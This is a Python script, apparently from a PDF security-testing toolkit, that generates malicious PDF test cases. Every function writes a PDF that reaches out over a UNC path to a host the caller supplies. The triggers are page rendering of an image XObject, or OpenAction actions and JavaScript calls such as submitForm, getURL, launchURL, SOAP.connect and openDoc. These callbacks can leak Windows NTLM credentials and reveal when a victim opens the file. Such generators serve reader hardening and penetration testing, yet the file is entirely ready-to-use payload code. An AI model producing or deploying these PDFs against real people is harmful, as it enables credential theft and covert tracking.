import base64
import bz2
import os


def _unc_host(host):
    """Strip scheme for UNC path."""
    return host.replace('https://', '').replace('http://', '').split('/')[0]


def _unc_action_pdf(filename, host, action_s, action_extra, label):
    """Helper to generate a PDF with a single UNC action on OpenAction."""
    unc = _unc_host(host)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: \'''' + label + '''\') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S ''' + action_s + '''
     ''' + action_extra + '''
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000570 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


# test34_1: UNC XObject stream (no action, triggered by page rendering)
def create_malpdf34_1(filename, host):
    unc = _unc_host(host)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 5 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'unc-xobj'    ) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace /DeviceRGB
     /F (\\\\''' + unc + '''\\test34_1-xobj.jpg)
     /Length 0
  >>
stream
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000600 00000 n
0000000750 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1000
%%EOF
''')


# test34_2: UNC GoToR action
def create_malpdf34_2(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/GoToR',
        '/F << /Type /FileSpec /F (\\\\\\\\' + unc + '\\\\test34_2-gotor.pdf) /V true >>\n     /D [0 /Fit]',
        'unc-gotor')


# test34_3: UNC Thread action
def create_malpdf34_3(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/Thread',
        '/F << /Type /FileSpec /F (\\\\\\\\' + unc + '\\\\test34_3-thread.pdf) /V true >>\n     /D 0',
        'unc-thread')


# test34_4: UNC URI action
def create_malpdf34_4(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/URI',
        '/URI (\\\\\\\\' + unc + '\\\\test34_4-uri)',
        'unc-uri')


# test34_5: UNC JS this.submitForm()
def create_malpdf34_5(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (this.submitForm({cURL: "\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\test34_5-submitform.fdf"}))',
        'unc-submitform')


# test34_6: UNC JS this.getURL()
def create_malpdf34_6(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (this.getURL("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\test34_6-geturl.pdf"))',
        'unc-geturl')


# test34_7: UNC JS app.launchURL()
def create_malpdf34_7(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (app.launchURL("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\test34_7-launchurl.pdf"))',
        'unc-launchurl')


# test34_8: UNC JS SOAP.connect()
def create_malpdf34_8(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (SOAP.connect("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\test34_8-soap.pdf"))',
        'unc-soap')


# test34_9: UNC JS app.openDoc()
def create_malpdf34_9(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (app.openDoc("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\test34_9-opendoc.pdf"))',
        'unc-opendoc')
